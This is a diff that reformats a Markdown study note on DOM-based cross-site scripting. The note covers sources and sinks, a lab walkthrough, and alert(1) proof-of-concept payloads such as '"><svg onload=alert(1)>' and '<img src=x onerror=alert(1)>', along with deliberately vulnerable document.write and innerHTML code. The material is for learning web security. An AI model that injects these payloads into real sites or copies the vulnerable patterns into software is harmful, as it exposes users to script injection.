@@ -858,7 +858,7 @@ Two key components define the vulnerability.
 A **source** is where attacker-controlled data enters JavaScript.
 
 Common sources:
-
+```
 - location.search  
 - location.hash  
 - document.cookie  
@@ -867,7 +867,7 @@ Common sources:
 - postMessage  
 - localStorage  
 - sessionStorage  
-
+```
 Example URL:
 
 site.com/?search=hello
@@ -883,7 +883,7 @@ location.search
 A **sink** is a dangerous JavaScript function that inserts or executes the data.
 
 Common sinks:
-
+```
 - document.write()  
 - innerHTML  
 - outerHTML  
@@ -892,7 +892,7 @@ Common sinks:
 - setTimeout()  
 - setInterval()  
 - Function()  
-
+```
 Example vulnerable code:
 
 document.write(location.search)
@@ -926,9 +926,9 @@ Search for:
 ABC123
 
 Found inside DOM:
-
+```
 <img src="/resources/images/tracker.gif?search=ABC123">
-
+```
 This confirms:
 
 Input appears inside an **image src attribute**.
@@ -960,22 +960,22 @@ JavaScript is writing attacker input directly into the DOM.
 Since input is inside an **HTML attribute**, we must break the attribute.
 
 Payload:
-
+```
 "><svg onload=alert(1)>
-
+```
 ---
 
 ### Step 5 — Browser Parses Payload
 
 Original DOM:
-
+```
 <img src="/tracker?search=ABC123">
-
+```
 After payload:
-
+```
 <img src="">
 <svg onload=alert(1)>
-
+```
 SVG loads.
 
 onload executes.
@@ -987,9 +987,9 @@ Alert appears.
 ### Step 6 — DOM Changes After Exploit
 
 Inspector now shows:
-
+```
 <svg onload="alert(1)">
-
+```
 JavaScript executes.
 
 → ✅ Lab solved
@@ -1013,13 +1013,13 @@ JavaScript executes.
 ## 🟢 1️⃣ document.write (Legacy Websites)
 
 Example code:
-
+```
 document.write(location.search)
-
+```
 Payload:
-
+```
 <script>alert(1)</script>
-
+```
 Why it works:
 
 document.write inserts raw HTML directly into the page.
@@ -1035,13 +1035,13 @@ Common in:
 ## 🟢 2️⃣ Attribute Injection
 
 Example:
-
+```
 document.write('<img src="'+location.search+'">')
-
+```
 Payload:
-
+```
 "><svg onload=alert(1)>
-
+```
 Breaks attribute → injects new tag.
 
 Real-world locations:
@@ -1055,13 +1055,13 @@ Real-world locations:
 ## 🟢 3️⃣ innerHTML Sink
 
 Example:
-
+```
 results.innerHTML = location.search
-
+```
 Payload:
-
+```
 <img src=x onerror=alert(1)>
-
+```
 Very common in:
 ```
 - Search result pages  
